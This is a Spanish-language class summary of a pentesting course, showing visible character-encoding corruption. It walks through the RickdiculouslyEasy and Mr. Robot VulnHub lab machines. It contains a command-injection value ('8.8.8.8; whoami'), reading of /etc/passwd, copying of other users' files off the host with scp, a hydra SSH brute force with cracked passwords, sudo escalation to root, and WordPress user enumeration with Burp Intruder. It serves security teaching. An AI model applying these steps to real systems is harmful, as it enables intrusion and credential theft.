# Resumen de la sesiÃ³n

SesiÃ³n de tipo Â«repaso dinÃ¡micoÂ» centrada en la **auditorÃ­a interna**: una vez se ha conseguido un primer acceso a la mÃ¡quina, Â¿cÃ³mo nos movemos por dentro hasta ser administradores? Se trabajaron dos mÃ¡quinas tipo CTF:

1.Â Â  **RickdiculouslyEasy** (VulnHub) â€” se retomÃ³ desde el acceso ya obtenido el viernes y se completÃ³: enumeraciÃ³n interna, robo de ficheros entre usuarios, descifrado de un binario, fuerza bruta de SSH y escalada final a root.

2.Â Â  **Mr. Robot** (VulnHub) â€” se empezÃ³ el reconocimiento y la enumeraciÃ³n web; queda pendiente terminar la fuerza bruta del panel de WordPress (continÃºa el jueves).

**Fases del pentest vistas hoy**

| | | | | | | | | | | | | |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|**Superficie expuesta**|**â†’**|**EnumeraciÃ³n**|**â†’**|**ExplotaciÃ³n**|**â†’**|**Mov. lateral**|**â†’**|**Escalada privilegios**|**â†’**|**Persistencia**|**â†’**|**Reporte**|

| |
|---|
|**â„¹Â  Idea central de la clase**<br><br>Lo que comprometemos primero suele ser una cuenta de servicio (p. ej. www-data), que casi no puede hacer nada. Desde ahÃ­ saltamos a cuentas de usuario (que sÃ­ tienen /home y permisos), de usuario a usuario las veces que haga falta, y finalmente a root. Ese salto final es la escalada de privilegios.|

# Conceptos base: tipos de cuenta y permisos

## Tipos de cuenta en un sistema

|**Tipo de cuenta**|**CaracterÃ­sticas**|**Ejemplos**|
|---|---|---|
|Cuenta de servicio|Creada para que corra un servicio en un puerto. Permisos muy reducidos sobre el sistema, amplios sobre su servicio. Sin /home real, con nologin.|www-data, apache, ftp|
|Cuenta de usuario|Persona real del sistema. Tiene /home propio, shell (/bin/bash) y permisos de lectura/escritura en su espacio.|summer, Morty, RickSanchez|
|Cuenta administrador|MÃ¡xima autoridad. No usa /home, sino /root.|root|

| |
|---|
|**â„¹Â  CÃ³mo leer /etc/passwd**<br><br>Cada lÃ­nea es un usuario. Lo importante son las dos Ãºltimas columnas: el **directorio** (si es /home/x o /root es un usuario legÃ­timo) y la **shell**. Si termina en /bin/bash puede usar terminal; si pone /usr/sbin/nologin es una cuenta de servicio sin acceso interactivo.|
|**Enumerar usuarios del sistema**|
|summer@target:~$ cat /etc/passwd<br><br>root:x:0:0:root:/root:/bin/bash<br><br>...<br><br>ftp:x:111:115:ftp daemon:/srv/ftp:/usr/sbin/nologinÂ Â  # cuenta de servicio<br><br>Morty:x:1001:1001::/home/Morty:/bin/bashÂ Â Â Â Â Â Â Â Â Â Â Â  # usuario real<br><br>RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash # usuario real|
|**âœ“Â  Matiz importante (FTP anÃ³nimo â‰  acceso al sistema)**<br><br>Que el FTP permita login anÃ³nimo no significa que el usuario ftp pueda entrar al sistema: esa cuenta solo accede a su propio servicio (su carpeta /srv/ftp), nunca a una shell.|

## Permisos de fichero (owner / group / others)

Los permisos se leen en tres bloques â€” **propietario, grupo y otros** â€” cada uno con r (lectura), w (escritura) y x (ejecuciÃ³n). Para copiar un fichero solo se necesitan dos cosas:

â€¢Â Â Â Â  **Origen legible** â†’ permiso r sobre el fichero que quiero copiar.

â€¢Â Â Â Â  **Destino escribible** â†’ permiso w sobre la carpeta donde lo dejo.

| |
|---|
|**â„¹Â  El sÃ­mil de la clase**<br><br>Aunque un libro (fichero) sea de otra persona y no puedas escribir en Ã©l, si lo puedes leer, puedes transcribirlo a tu libreta (una carpeta donde sÃ­ tienes escritura) y entonces hacer con esa copia lo que quieras.|
|**âš Â  La carpeta /tmp y el sticky bit**<br><br>La carpeta /tmp tiene permisos de lectura, escritura y ejecuciÃ³n para todos (de ahÃ­ el color distinto en ls, por la Â«tÂ» de sticky bit). Por eso se usa tanto para subir y ejecutar herramientas cuando la cuenta comprometida no tiene un /home donde escribir. Como administrador de sistemas, es una carpeta a vigilar.|

# Parte 1 Â· RickdiculouslyEasy (VulnHub)

| |
|---|
|**â„¹Â  Datos de la mÃ¡quina**<br><br>IP vÃ­ctima: 10.0.2.15Â Â  Â·Â Â  Usuarios: Morty, summer, RickSanchezÂ Â  Â·Â Â  Objetivo: sumar flags hasta llegar a root.|

## 1. Repaso de la fase externa (clase del viernes)

La auditorÃ­a externa ya estaba hecha. Resumen de lo conseguido desde fuera:

|**Puerto**|**Servicio**|**Hallazgo**|
|---|---|---|
|21|FTP (anonymous)|Login anÃ³nimo permitido. Con get se descarga flag.txt (en FTP no hay cat; con help se ven sus comandos). Un directorio sin nada Ãºtil.|
|22|Â«SSHÂ» falso|Nmap solo veÃ­a un tcpwrapped. Al intentar conectar no daba conexiÃ³n â†’ puerto muerto.|
|80|Web|robots.txt â†’ /cgi-bin/.... Un script tipo tracer ejecutaba comandos en el backend (RCE por concatenaciÃ³n).|
|9090|Cockpit (Fedora)|Panel sin exploit pÃºblico â†’ rabbit hole. Solo daba una flag.|
|13337 / 22222 / 60000|Ocultos (nmap -p-)|60000 = backdoor con shell vÃ­a nc; 22222 = el SSH real; varias flags.|

| |
|---|
|**Fase externa â€” comandos clave**|
|# 1) Descubrir activos en mi rango de red (lo obtengo con ifconfig)<br><br>sudo netdiscover -r 10.0.2.0/24<br><br># 2) Escaneo silencioso inicial (sin parÃ¡metros) y luego scripts+versiones<br><br>nmap 10.0.2.15<br><br>nmap -sCV 10.0.2.15<br><br># 3) Escaneo de TODOS los puertos: aparecen los ocultos<br><br>nmap -p- 10.0.2.15<br><br># EnumeraciÃ³n de directorios de la web<br><br>dirsearch -u http://10.0.2.15<br><br># Backdoor sin autenticaciÃ³n en el puerto 60000<br><br>nc 10.0.2.15 60000|
|**âœ“Â  RCE por concatenaciÃ³n de comandos**<br><br>El formulario que pedÃ­a una IP ejecutaba traceroute en el servidor. Al concatenar con ; o && (p. ej. 8.8.8.8; whoami) el backend respondÃ­a como www-data, confirmando ejecuciÃ³n remota de comandos.|
|**â„¹Â  La contraseÃ±a Â«winterÂ»**<br><br>Con dirsearch apareciÃ³ un directorio /passwords/. La pÃ¡gina parecÃ­a vacÃ­a, pero en **ver cÃ³digo fuente** habÃ­a un comentario con la contraseÃ±a winter, que resultÃ³ ser la del usuario summer.|

## 2. Acceso inicial por SSH

El SSH real no estÃ¡ en el 22, sino en el 22222. Con las credenciales summer:winter entramos:

| |
|---|
|**Acceso interactivo**|
|ssh summer@10.0.2.15 -p 22222<br><br># (contraseÃ±a: winter)|
|**âš Â  Â¿Por quÃ© Nmap Â«mentÃ­aÂ» en el puerto 22?**<br><br>Sin parÃ¡metros, Nmap muestra el servicio **esperado por defecto** en cada puerto. Con -sCV hace descubrimiento activo y muestra lo que **realmente** hay: el 22 era un servicio falso (tcpwrapped) y el SSH autÃ©ntico estaba en el 22222 (OpenSSH).|

## 3. EnumeraciÃ³n interna (Â«ser cotillaÂ»)

Ya dentro, antes de atacar conviene reconocer el terreno. Comandos que se lanzan casi siempre tras un compromiso de Linux:

| |
|---|
|**Checklist de enumeraciÃ³n interna**|
|# Leer la flag que tenemos delante (cat no iba; se usÃ³ head)<br><br>head -n 20 flag.txt<br><br># Usuarios del sistema<br><br>cat /etc/passwd<br><br># Â¿QuÃ© puedo ejecutar como root sin contraseÃ±a?Â  (vector de escalada nÂº1)<br><br>sudo -l<br><br># VersiÃ³n de kernel/SO (para buscar exploits si hiciera falta)<br><br>uname -a<br><br># Buscar binarios con bit SUID (permiso 4000)<br><br>find / -perm -4000 2>/dev/null|
|**â„¹Â  sudo -l vs SUID**<br><br>sudo -l lista los comandos que mi usuario puede ejecutar como root (reglas de grupo predefinidas). El **bit SUID** son ficheros concretos marcados para ejecutarse con los permisos de su propietario. En esta mÃ¡quina sudo -l saliÃ³ vacÃ­o para summer â€” algo totalmente normal en un primer compromiso.|

## 4. Robo de ficheros entre usuarios

Desde summer se exploran los /home de los otros usuarios. Tenemos lectura sobre sus carpetas:

**Carpeta de RickSanchez â†’ binario Â«safeÂ»**

| |
|---|
|**El binario protegido**|
|cd /home/RickSanchez/RICKS_SAFE<br><br>ls -la<br><br>file safeÂ Â Â Â Â Â Â Â Â  # -> ejecutable (ELF)<br><br>./safeÂ Â Â Â Â Â Â Â Â Â Â Â  # pide argumentos: "use good command line arguments"|
|**âš Â  Permisos: por quÃ© fallÃ³ ./safe al principio**<br><br>Sobre safe como summer solo tenÃ­amos r (lectura), no x. La soluciÃ³n es **copiarlo** a una carpeta nuestra (origen legible + destino escribible) y trabajarlo allÃ­.|

**Carpeta de Morty â†’ imagen + zip**

En /home/Morty hay un Safe_Password.jpg y un journal.txt.zip protegido. Nos los llevamos a nuestra Kali.

## 5. Transferencia de ficheros: cp y scp

Dentro de la vÃ­ctima copiamos con cp. Para traer ficheros a nuestra Kali se usa scp (que es Â«cp a travÃ©s del protocolo SSHÂ»). Misma sintaxis que ssh, recordando especificar el puerto con -P:

| |
|---|
|**cp interno y scp hacia la mÃ¡quina atacante**|
|# Copia interna (mover a una carpeta donde tengo escritura)<br><br>cp /home/RickSanchez/RICKS_SAFE/safe /tmp/<br><br>cp /home/RickSanchez/RICKS_SAFE/safe ../summer/<br><br># Traer ficheros de la vÃ­ctima a mi Kali (ojo al puerto 22222)<br><br>scp -P 22222 summer@10.0.2.15:/home/Morty/Safe_Password.jpg .<br><br>scp -P 22222 summer@10.0.2.15:/home/Morty/journal.txt.zip .<br><br># (contraseÃ±a: winter)|
|**â„¹Â  scp es bidireccional**<br><br>Igual que descargamos, podrÃ­amos **subir** a la vÃ­ctima invirtiendo origen y destino: scp -P 22222 fichero.sh summer@10.0.2.15:/tmp/.|

## 6. AnÃ¡lisis de los ficheros robados

La imagen no se abre en la vÃ­ctima (es solo terminal) y exiftool no estÃ¡ instalado allÃ­ â€” es propio de Kali, no de un Linux normal. Por eso trabajamos en la Kali:

| |
|---|
|**Metadatos y strings de la imagen**|
|exiftool Safe_Password.jpgÂ Â Â Â  # metadatos: poca cosa relevante<br><br>strings Safe_Password.jpgÂ Â Â Â Â  # cadenas embebidas -> aparece una contraseÃ±a|
|**â„¹Â  strings: leer el Â«bajo nivelÂ» de un fichero**<br><br>strings extrae las cadenas de texto legibles dentro de cualquier fichero (ejecutable, imagenâ€¦). En la imagen revelÃ³ una contraseÃ±a incrustada â€” tÃ©cnica relacionada con la **esteganografÃ­a** (informaciÃ³n escondida en pÃ­xeles que Â«pierdenÂ» su color, p. ej. un pÃ­xel negro).|
|**âš Â  Valor de la contraseÃ±a (transcripciÃ³n de audio)**<br><br>La contraseÃ±a incrustada en la imagen se citÃ³ de oÃ­do como Â«music / MISICÂ»; al ser audio, conviene confirmarla con la cadena exacta que devuelve strings en pantalla. Es la que abre el journal.txt.zip y el argumento del binario safe.|

Con esa contraseÃ±a se descomprime el zip y se ejecuta el binario:

| |
|---|
|**Descifrado del zip y del binario**|
|unzip journal.txt.zipÂ Â Â Â Â Â Â Â Â  # pide la contraseÃ±a hallada<br><br>cat journal.txtÂ Â Â Â Â Â Â Â Â Â Â Â Â Â  # pista narrativa + una flag<br><br># El binario safe, con sus argumentos correctos, suelta otra flag<br><br>./safe <argumento_de_la_imagen>|
|**âœ“Â  Pista clave: la polÃ­tica de contraseÃ±a de Rick**<br><br>Al resolver el binario aparece un **Rick's Password Hints**: su contraseÃ±a se compone de **una mayÃºscula + un dÃ­gito + una palabra del nombre de su antigua banda**.|

## 7. Generar diccionario + fuerza bruta SSH (Hydra)

| |
|---|
|**â„¹Â  AmpliaciÃ³n Â· El nombre de la banda**<br><br>La banda de Rick SÃ¡nchez es **The Flesh Curtains** (en la transcripciÃ³n se oyÃ³ como Â«de fresh cool timesÂ»). La palabra que entra en la contraseÃ±a es Curtains, coherente con la clave final encontrada.|

Aplicando la regla (mayÃºscula + dÃ­gito + palabra de la banda) se generÃ³ un diccionario de ~780 combinaciones y se lanzÃ³ hydra contra el SSH:

| |
|---|
|**Fuerza bruta del SSH con Hydra**|
|# Estructura de hydra para SSH (ojo al puerto):<br><br>#Â Â  -l usuarioÂ Â Â Â  -L lista_usuarios<br><br>#Â Â  -p contraseÃ±aÂ  -P lista_contraseÃ±as<br><br>hydra -l RickSanchez -P diccionario.txt ssh://10.0.2.15:22222|
|**âœ“Â  Credencial encontrada**<br><br>Hydra devolviÃ³ la contraseÃ±a de RickSanchez: P7CurtainsÂ  (transcrita de oÃ­do como Â«p7curtainsÂ»). Encaja con la polÃ­tica: mayÃºscula + dÃ­gito + palabra de la banda.|

## 8. Escalada final a root

| |
|---|
|**De RickSanchez a root**|
|ssh RickSanchez@10.0.2.15 -p 22222Â Â Â  # contraseÃ±a: P7Curtains<br><br>whoamiÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # RickSanchez<br><br>sudo -lÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # -> (ALL : ALL) ALL<br><br># Como puedo ejecutar cualquier comando como root, cambio de usuario:<br><br>sudo su<br><br>whoamiÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # root<br><br>cat /root/*flag*|
|**âœ“Â  Por quÃ© funciona sudo su sin la contraseÃ±a de root**<br><br>sudo su cambia a root, lo que normalmente pedirÃ­a la contraseÃ±a de root. Pero como sudo -l indica (ALL : ALL) ALL, RickSanchez puede ejecutar cualquier comando como root **sin que se la pida**. Equivale a Â«ejecutar como administradorÂ» en Windows cuando ya tienes el permiso concedido.|

**Cadena completa de la mÃ¡quina**

| | | | | | | | | |
|---|---|---|---|---|---|---|---|---|
|**www-data (RCE web)**|**â†’**|**summer (SSH:22222)**|**â†’**|**Robo de ficheros**|**â†’**|**Hydra â†’ RickSanchez**|**â†’**|**sudo su â†’ root**|

# Parte 2 Â· Mr. Robot (VulnHub) â€” inicio

| |
|---|
|**âš Â  MÃ¡quina sin terminar**<br><br>Solo se hizo el reconocimiento y el comienzo de la enumeraciÃ³n web. La fuerza bruta del panel de WordPress se dejÃ³ corriendo y se continÃºa el jueves.|
|**â„¹Â  Datos de la mÃ¡quina**<br><br>IP vÃ­ctima: 10.0.2.7Â Â  Â·Â Â  El nombre y el Â«loreÂ» de la serie Mr. Robot son pistas para adivinar usuarios.|

## 1. Reconocimiento

|**Descubrimiento**|
|sudo netdiscover -r 10.0.2.0/24Â Â Â Â Â  # localizar la IP de la vÃ­ctima<br><br>nmap -p- -sCV 10.0.2.7Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # todos los puertos + versiones|
|**Puerto**|**Estado**|**Notas**|
|---|---|---|
|22|Cerrado|SSH no disponible.|
|80|Abierto|Servidor web HTTP.|
|443|Abierto|El 80 con capa SSL/TLS (HTTPS). El 80 suele redirigir al 443.|

| |
|---|
|**â„¹Â  AmpliaciÃ³n Â· 80 vs 443**<br><br>El puerto 443 es esencialmente el puerto 80 con una capa de cifrado (un certificado SSL/TLS que protege las comunicaciones). Por eso es habitual que el contenido sea el mismo y que 80 redirija a 443.|

## 2. EnumeraciÃ³n web y robots.txt

La web muestra una animaciÃ³n tipo terminal de la serie. Se enumera con dirsearch / feroxbuster y se interpretan los cÃ³digos de respuesta:

|**CÃ³digo**|**Significado**|
|---|---|
|200|OK|
|301 / 302|RedirecciÃ³n|
|403|Prohibido|
|404|No encontrado|

| |
|---|
|**â„¹Â  Truco mnemotÃ©cnico de clase**<br><br>Para recordar los cÃ³digos HTTP con gatitos: https://http.cat.|

La enumeraciÃ³n revela /wp-login, /license, un /dashboard y, sobre todo, el robots.txt â€” el guiÃ±o del tÃ­tulo de la clase:

| |
|---|
|**robots.txt**|
|# http://10.0.2.7/robots.txt<br><br>User-agent: *<br><br>key-1-of-3.txtÂ Â Â Â Â  # <- primera flag<br><br>fsocity.dicÂ Â Â Â Â Â Â Â  # <- diccionario (~858.000 lÃ­neas)|
|**â„¹Â  QuÃ© dice realmente robots.txt**<br><br>Indica a los crawlers (Google, Yandexâ€¦) quÃ© pueden indexar. User-agent: * = aplica a todos los navegadores. Para un atacante es oro: suele listar rutas y ficheros que el dueÃ±o no querÃ­a visibles. AquÃ­ destapa una flag y un diccionario.|

## 3. Sanitizar el diccionario

El fsocity.dic tiene ~858.000 lÃ­neas, muchas repetidas. Antes de una fuerza bruta hay que limpiarlo (quitar duplicados):

| |
|---|
|**Limpieza con sort | uniq**|
|wc -l fsocity.dicÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # ~858.000 lineas<br><br>sort fsocity.dic | uniq > fsocity_clean.dic<br><br>wc -l fsocity_clean.dicÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # ~11.452 lineas unicas|
|**âœ“Â  Por quÃ© importa**<br><br>Pasar de 858.000 a 11.452 lÃ­neas (~80 veces menos) reduce drÃ¡sticamente el tiempo de la fuerza bruta. Sanitizar siempre los diccionarios que saquemos de una mÃ¡quina es una buena prÃ¡ctica.|

## 4. WordPress + information disclosure

En /wp-login.php se observa una **fuga de informaciÃ³n** por los mensajes de error: si el usuario no existe responde Invalid username; si existe pero la contraseÃ±a falla, responde incorrect password. Eso permite **enumerar usuarios**.

| |
|---|
|**â„¹Â  Information disclosure en logins**<br><br>Un login bien diseÃ±ado deberÃ­a dar un mensaje genÃ©rico (Â«usuario o contraseÃ±a incorrectosÂ»). Cuando distingue entre Â«usuario invÃ¡lidoÂ» y Â«contraseÃ±a incorrectaÂ», revela quÃ© usuarios existen â€” exactamente lo que explotamos aquÃ­.|

## 5. Burp Suite: interceptar y atacar

Se usa **Burp Suite** como proxy (con la extensiÃ³n FoxyProxy en el navegador) para interceptar las peticiones entre nuestra mÃ¡quina y el servidor:

â€¢Â Â Â Â  Proxy â†’ Intercept ON: la peticiÃ³n queda Â«retenidaÂ» hasta que la liberamos con Forward.

â€¢Â Â Â Â  Repeater (clic derecho â†’ Send to Repeater): reenvÃ­a una misma peticiÃ³n modificÃ¡ndola para ver la respuesta.

â€¢Â Â Â Â  Intruder (modo Sniper): automatiza el envÃ­o masivo cambiando un parÃ¡metro con un diccionario (el payload).

| |
|---|
|**â„¹Â  AnatomÃ­a de la peticiÃ³n de login**<br><br>Es un POST a /wp-login.php porque enviamos datos a la base de datos (un GET serÃ­a para pedir informaciÃ³n). Campos relevantes: log (usuario) y pwd (contraseÃ±a). En la respuesta lo clave es la **longitud**: el error Â«invalid usernameÂ» medÃ­a ~4065 bytes.|

## 6. Enumerar el usuario por longitud de respuesta

En Intruder se marca el campo de usuario como payload y se prueban candidatos. Todos los genÃ©ricos (admin, user, etc.) devuelven la misma longitud (~4065 = Â«invalid usernameÂ»). Pero el protagonista de la serie sÃ­ existe:

|**Usuario probado**|**Longitud respuesta**|**InterpretaciÃ³n**|
|---|---|---|
|admin / user / user1â€¦|~4065 bytes|Â«Invalid usernameÂ» â†’ no existe|
|Elliot|**~4116 bytes**|Distinta â†’ Â«the password is incorrectÂ» = **usuario vÃ¡lido**|

| |
|---|
|**âœ“Â  Resultado**<br><br>El usuario Elliot existe (longitud de respuesta distinta y mensaje de error diferente). El siguiente paso es repetir el ataque con Intruder sobre el campo pwd, usando el diccionario limpio, y buscar de nuevo la longitud de respuesta que Â«se salgaÂ» del resto.|

## Cadena de la mÃ¡quina (hasta ahora)

| | | | | | | | | |
|---|---|---|---|---|---|---|---|---|
|**nmap (80/443)**|**â†’**|**robots.txt â†’ fsocity.dic**|**â†’**|**Limpiar diccionario**|**â†’**|**Enumerar usuario: Elliot**|**â†’**|**Fuerza bruta pwd (pendiente)**|
|**â„¹Â  Sobre versiones de WordPress (pregunta de clase)**<br><br>La fuga de informaciÃ³n usuario/contraseÃ±a no es un fallo de versiÃ³n: es una opciÃ³n de configuraciÃ³n del propietario en el panel de WordPress. Las versiones modernas vienen configuradas por defecto para no revelarlo; antiguamente sÃ­ se podÃ­a dejar activado.|

# Herramientas y comandos de referencia

|**Herramienta**|**Para quÃ©**|**Uso visto en clase**|
|---|---|---|
|netdiscover|Descubrir activos en la red local|sudo netdiscover -r 10.0.2.0/24|
|nmap|Escaneo de puertos / versiones|nmap -sCV <ip> Â· nmap -p- <ip>|
|dirsearch / feroxbuster|EnumeraciÃ³n de directorios web|dirsearch -u http://<ip>|
|nc (netcat)|Conexiones TCP crudas / shells|nc 10.0.2.15 60000|
|ssh|Acceso remoto|ssh user@<ip> -p 22222|
|scp|Copiar ficheros vÃ­a SSH|scp -P 22222 user@<ip>:/ruta .|
|find (SUID)|Buscar binarios privilegiados|find / -perm -4000 2>/dev/null|
|strings / exiftool|Inspeccionar ficheros e imÃ¡genes|strings img.jpg Â· exiftool img.jpg|
|hydra|Fuerza bruta de credenciales|hydra -l user -P dic.txt ssh://<ip>:22222|
|sort | uniq|Sanitizar diccionarios|sort dic | uniq > dic_clean|
|Burp Suite + FoxyProxy|AuditorÃ­a web (proxy/repeater/intruder)|EnumeraciÃ³n por longitud de respuesta|

# Pendiente para la prÃ³xima clase

â€¢Â Â Â Â  **Mr. Robot**: terminar la fuerza bruta de la contraseÃ±a de Elliot con Intruder + diccionario limpio, y continuar hacia las 3 flags (continÃºa el jueves con Dani / Carlos).

â€¢Â Â Â Â  Se mostrarÃ¡ lo de **Hack The Box** que quedÃ³ pendiente; ya se puede empezar a hacer mÃ¡quinas por cuenta propia.

â€¢Â Â Â Â  Las prÃ³ximas mÃ¡quinas profundizarÃ¡n en escaladas de privilegios y movimiento lateral con varios saltos entre usuarios.

| |
|---|
|**âœ“Â  Mentalidad del CTF**<br><br>Como recordÃ³ Carlos: el flujo siempre es el mismo â€” superficie de exposiciÃ³n â†’ enumero â†’ exploto â†’ consigo shell â†’ vuelvo a enumerar dentro â†’ escalo privilegios. El objetivo de estos repasos es que ese ciclo Â«sueneÂ» antes de verlo paso a paso en detalle.|

â†’

â†’

